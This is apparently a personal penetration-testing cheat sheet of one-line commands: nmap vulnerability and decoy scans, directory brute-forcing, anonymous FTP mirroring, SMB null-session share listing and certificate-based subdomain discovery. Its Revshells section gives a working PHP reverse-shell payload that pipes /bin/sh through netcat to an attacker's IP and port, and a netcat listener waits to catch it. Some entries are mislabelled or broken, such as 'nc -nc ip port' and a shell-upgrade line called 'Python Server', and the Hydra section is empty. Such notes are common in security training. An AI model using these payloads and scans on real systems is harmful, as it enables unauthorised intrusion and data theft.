# Useful Codes
---
## nMap
---
- Vulnerability Script Nmap SE
```bash
sudo nmap $IP -sV --script vuln
```
- Decoy IP Nmap
```bash
sudo nmap $IP -sS -Pn -n -D RND:5
```
- Update Script DB
```bash
sudo nmap --script-updatedb
```
- Find Scripts for nMap
```bash
find / -type f -name $INPUT* 2>/dev/null | grep scripts
```
- FTP Scan with Scripts
```bash
sudo nmap -sV -p21 -sC -A 10.129.14.136
```
- SMB Scan with Scripts
```bash
sudo nmap $IP -sV -sC -p139,445
```
---
## Gobuster
---
- Gobuster Dir

```bash
gobuster dir -u http://$IP --wordlist $Wordlist
```
---
## Hydra
---



---
## Netcat
---
- Listening for incoming RevShells
```sh
nc -lvnp port
```
- Listen for incoming calls
```sh
nc -nc ip port
```

---
## Python
---
- Python Server
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---
## Revshells
---
- PHP Reverse Shell
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"); ?>
```

---
## XML Prettyfy
---
```bash
xsltproc all.xml -o all.html (nmap xml to html)
```
---
## SSL Certificate
- Check Certificate Term Json
```bash
curl -s https://crt.sh/\?q\=$Domain\&output\=json | jq .
```
- Check Certificate Unique Subdomain
```bash
curl -s https://crt.sh/\?q\=$Domain\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
```
---
## FTP
- Download All Available Files
```bash
wget -m --no-passive ftp://anonymous:anonymous@$IP

```
- Recursive Listing
```bash
ls -R
```
---
## SMB (Samba)

- Get Smb config
```bash
cat /etc/samba/smb.conf | grep -v "#\|\;" 
```

- List Server's Shares with Null Session (-N) that is an anonymous access.
```bash
smbclient -N -L //$IP
```

---
## Various
- Lista Folder
```bash
tree $PATH
```
